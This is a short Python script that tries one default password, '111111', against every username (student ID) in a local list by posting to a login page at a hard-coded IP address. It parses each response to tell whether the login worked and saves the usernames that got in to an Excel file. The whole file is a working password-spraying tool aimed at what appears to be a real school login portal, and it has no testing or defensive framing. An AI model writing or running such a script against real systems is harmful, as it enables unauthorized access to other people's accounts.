import requests
import pyexcel_xls
import xlwt
from bs4 import BeautifulSoup

#passFile=open('F:/pwd.txt')
nameFile=open('F:/name1.txt')
url = 'http://113.55.4.18/login/index.php'

i=0
book = xlwt.Workbook(style_compression=0)
sheet = book.add_sheet('sheet1', cell_overwrite_ok=True)

for line in nameFile.readlines():
    #password = line.strip('\n')
    name=line.strip('\n')
    params = {"username": name, "password": '111111'}
    html=requests.post(url,data=params)
    #print(html.text)
    soup = BeautifulSoup(html.text,'lxml')
    #print(soup.prettify())
    p = soup.find_all(class_='tree_item leaf hasicon')
    #print(divs)
    if p == []:
        #print("failed")
        #pyexcel_xls.save_data(array=name, dest_file_name="hello.xlsx")
        continue
    else:
        print("succeed")
        print("学号：",name)
        #pyexcel_xls.save_data(array=name, dest_file_name="hello.xlsx")
        sheet.write(i, 0, name)
        i += 1
        book.save('F://123test.xls')